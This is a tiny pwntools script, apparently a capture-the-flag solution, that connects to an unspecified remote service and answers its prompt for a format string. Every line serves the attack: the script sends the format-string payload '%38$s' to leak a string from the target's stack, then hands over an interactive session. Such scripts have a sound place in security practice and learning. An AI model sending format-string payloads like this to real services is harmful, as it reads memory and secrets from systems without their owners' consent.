from pwn import *

context.log_level = "debug"

io = remote (...)

io.recvuntil(b"Input your format string.")
io.sendline(b"%38$s")
io.interactive()
